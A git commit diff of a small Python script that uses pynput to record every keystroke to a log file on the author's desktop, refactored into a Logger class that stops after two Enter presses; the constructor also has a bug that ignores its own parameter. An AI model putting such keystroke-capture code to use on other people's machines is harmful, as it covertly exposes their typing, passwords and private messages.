2533ee5347a088b5a097a78bb0ca5a2387e74eea
Benjamin Pollak <benjaminwpollak@gmail.com>
2018-03-31 17:35:47 -0500

    log class written, merge back to master

--- main.py
+++ main.py
@@ -1,12 +1,28 @@
 from pynput.keyboard import Key, Listener
 import logging
 
-file_log = 'C:\\Users\\Benjamin Pollak\\Desktop\\loggo.txt'
+class Logger:
+    def __init__(self, log_name):
+        self.log_name = log_file
+        self.num_times_enter_pressed = 0
+    
+    def on_press(self, key):
+        myChar = str(key)
+        if(myChar == "Key.enter"):
+            # TODO: close the file
+            self.num_times_enter_pressed+=1
+            if(self.num_times_enter_pressed == 2):
+                return False
+        logging.info(str(key))
+	
+    def log_keystrokes(self):
+        logging.basicConfig(filename=(self.log_name), level=logging.DEBUG, format='%(message)s')
+        #logging.basicConfig(filename=(self.log_name), level=logging.DEBUG, format='%(asctime)s: %(message)s')
+        
+        with Listener(on_press=self.on_press) as listener:
+            listener.join()
 
-logging.basicConfig(filename=(file_log), level=logging.DEBUG, format='%(asctime)s: %(message)s')
-
-def on_press(key):
-    logging.info(str(key))
-
-with Listener(on_press=on_press) as listener:
-    listener.join()
+if __name__ == '__main__':
+    log_file = 'C:\\Users\\Benjamin Pollak\\Desktop\\log.txt'
+    logger = Logger(log_file)
+    logger.log_keystrokes()
